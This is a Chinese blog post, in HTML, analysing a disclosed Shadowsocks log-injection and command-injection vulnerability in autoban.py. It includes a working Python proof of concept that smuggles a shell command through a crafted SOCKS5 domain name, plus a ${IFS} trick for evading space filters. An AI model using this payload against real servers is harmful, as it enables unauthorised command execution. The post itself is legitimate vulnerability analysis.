@@ -1,0 +1,677 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Python," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="retanoj's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="前言10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，文章在此。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。
+漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。
+要点
+日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。
+命令执">
+<meta property="og:type" content="article">
+<meta property="og:title" content="X41 D-Sec Shadowsocks RCE分析">
+<meta property="og:url" content="http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-RCE分析/index.html">
+<meta property="og:site_name" content="retanoj's Blog">
+<meta property="og:description" content="前言10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，文章在此。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。
+漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。
+要点
+日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。
+命令执">
+<meta property="og:updated_time" content="2017-10-14T17:13:59.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="X41 D-Sec Shadowsocks RCE分析">
+<meta name="twitter:description" content="前言10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，文章在此。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。
+漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。
+要点
+日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。
+命令执">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://retanoj.github.io/2017/11/14/Python-2017-10-14-X41-D-Sec-Shadowsocks-RCE分析/"/>
+
+
+  <title> X41 D-Sec Shadowsocks RCE分析 | retanoj's Blog </title>
+<style>
+#header {
+  background-image: url(/images/banner.jpg);
+  background-size: cover;
+}
+</style>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">retanoj's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                X41 D-Sec Shadowsocks RCE分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-11-14T00:00:00+08:00" content="2017-11-14">
+              2017-11-14
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>10月13号X41 D-Sec组织披露了有关Shadowsocks的一些漏洞，<a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="external">文章在此</a>。以下对文中提及的日志文件写入和命令执行漏洞进行简要分析。</p>
+<p>漏洞细节还是很简单的，但其中涉及到了一些小技巧还是可以提一提的。</p>
+<h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol>
+<li>日志文件写入漏洞原因在于Shadowsocks基于Socks5的代理是支持用域名作为连接目标的，在精心构造目标域名为可控内容时，Shadowsocks会将其直接写入日志。</li>
+<li>命令执行漏洞原因在于Shadowsocks提供的用于检测与封禁暴力破解IP的autoban.py脚本在处理日志时不严谨，造成字符串拼接形式的命令执行。</li>
+</ol>
+<h2 id="LOG-FILE-MANIPULATION"><a href="#LOG-FILE-MANIPULATION" class="headerlink" title="LOG FILE MANIPULATION"></a>LOG FILE MANIPULATION</h2><p>角色有三：ss服务器端，ss客户端和用户端。</p>
+<p>ss客户端作为socks5代理，在接收到用户端发送过来的请求后，会对请求进行解析。关键解析函数shadowsocks/common.py中parse_header(data)函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p>
+<p>ss客户端会将请求向后传输给ss服务器端，ss服务器端也会如上写入日志。</p>
+<p>因此，如果可以控制用户端请求的目标地址部分，即可将任意内容写入日志。简单写个脚本如下，9001是ss客户端地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line">eval_data = <span class="string">"foo\nbar\ntail"</span></div><div class="line"></div><div class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</div><div class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">9001</span>))</div><div class="line"></div><div class="line">s.send(hello)</div><div class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</div><div class="line">s.send(target)</div><div class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</div><div class="line"></div><div class="line">s.close()</div></pre></td></tr></table></figure>
+<p>查看日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; cat /tmp/ss/client.log</div><div class="line"></div><div class="line">2017-10-14 20:34:00 INFO     connecting foo</div><div class="line">bar</div><div class="line">tail:80 from 127.0.0.1:62977</div></pre></td></tr></table></figure>
+<p>可以看到，“bar”是单行写入的，漏洞触发成功。</p>
+<h2 id="COMMAND-EXECUTION"><a href="#COMMAND-EXECUTION" class="headerlink" title="COMMAND EXECUTION"></a>COMMAND EXECUTION</h2><p>autoban.py脚本的作用是通过检查ss日志中的错误来对请求来源ip进行一些封禁处理。脚本处于shadowsocks/utils/autoban.py。</p>
+<p>内容简短说就是按行查日志，如果出现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">can not parse header when</div></pre></td></tr></table></figure>
+<p>关键字符串在行内就进一步处理，最终提取来源IP拼接进cmd执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cmd = <span class="string">'iptables -A INPUT -s %s -j DROP'</span> % ip</div><div class="line">os.system(cmd)</div></pre></td></tr></table></figure>
+<p>也就是说，在日志内容可控的情况下，完全可以通过精心构造请求来达到ip的内容可控，从而造成命令执行。</p>
+<p>这里有三个坑：</p>
+<ol>
+<li>命令内容不能有空格，不然被切开了</li>
+<li>命令内容不能有冒号，不然被切开了</li>
+<li>脚本查来源ip是有频次控制的，默认为3。也就是攻击请求需要发三次以上才会触发autoban的ban。</li>
+</ol>
+<p>源文中为了绕过空格限制，给出的POC用到了一个将日志作为脚本执行的方法，但并不是很好，因为需要知道ss的日志存储路径。如果路径非默认，就没用了。</p>
+<p>这里需要提一下执行bash脚本不用空格的方法。主要用到了${IFS}环境变量，${IFS}=‘空格\n\t\00’，空格在第一个字符。<br>直接给出吧：</p>
+<ol>
+<li>echo “a${IFS:0:1}b” 从0位置截取1个字符，这里不能用，因为引入冒号了</li>
+<li>echo “a${IFS%???}b” %逆向裁掉3个字符，?是占位符，这个可以用</li>
+</ol>
+<p>因此POC也呼之欲出了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></div></pre></td></tr></table></figure></p>
+<p>最后给出完成测试过程：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">启动ss服务端</div><div class="line">python server.py <span class="_">-s</span> 127.0.0.1 -p 9000 -k 1234 --log-file /tmp/ss/server.log --pid-file /tmp/ss/server.pid <span class="_">-d</span> start</div><div class="line"></div><div class="line">启动ss客户端</div><div class="line">python local.py <span class="_">-s</span> 127.0.0.1 -p 9000 <span class="_">-l</span> 9001 -k 1234 --log-file /tmp/ss/client.log --pid-file /tmp/ss/client.pid <span class="_">-d</span> start</div><div class="line"></div><div class="line">模拟定时启动autoban.py脚本检查ss客户端日志</div><div class="line">watch -n 1 <span class="string">"python autoban.py &lt; /tmp/ss/client.log"</span></div><div class="line"></div><div class="line">执行POC(3次！！3次！！3次！！默认就是3次！！我就不写循环:)</div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line">import socket</div><div class="line"></div><div class="line">eval_data = <span class="string">"can not parse header when ||touch<span class="variable">$&#123;IFS%???&#125;</span>&gt;<span class="variable">$&#123;IFS%???&#125;</span>/tmp/ss/eval.txt&amp;:\n"</span></div><div class="line"></div><div class="line">hello = <span class="string">"050100"</span>.decode(<span class="string">'hex'</span>)</div><div class="line">target = (<span class="string">"05010003%02x%s0050"</span> % (len(eval_data), eval_data.encode(<span class="string">'hex'</span>))).decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((<span class="string">'127.0.0.1'</span>, 9001))</div><div class="line"></div><div class="line">s.send(hello)</div><div class="line"><span class="built_in">print</span> s.recv(1024)</div><div class="line">s.send(target)</div><div class="line"><span class="built_in">print</span> s.recv(1024)</div><div class="line"></div><div class="line">s.close()</div><div class="line"></div><div class="line">查看eval.txt是否存在</div><div class="line">ls -al /tmp/ss/eval.txt</div></pre></td></tr></table></figure></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>谁没事儿会用autoban.py啊，大家的ss还是很安全的 :)</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Python/" rel="tag">#Python</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/" rel="next" title="Java反序列化漏洞原理小记">
+                <i class="fa fa-chevron-left"></i> Java反序列化漏洞原理小记
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="retanoj" />
+          <p class="site-author-name" itemprop="name">retanoj</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/">
+              <span class="site-state-item-count">11</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/retanoj" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/retan0j" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/jonater" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#要点"><span class="nav-number">2.</span> <span class="nav-text">要点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LOG-FILE-MANIPULATION"><span class="nav-number">3.</span> <span class="nav-text">LOG FILE MANIPULATION</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#COMMAND-EXECUTION"><span class="nav-number">4.</span> <span class="nav-text">COMMAND EXECUTION</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后"><span class="nav-number">5.</span> <span class="nav-text">最后</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">retanoj</span>
+</div>
+
+<div class="powered-by">
+  欢迎光临:)
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
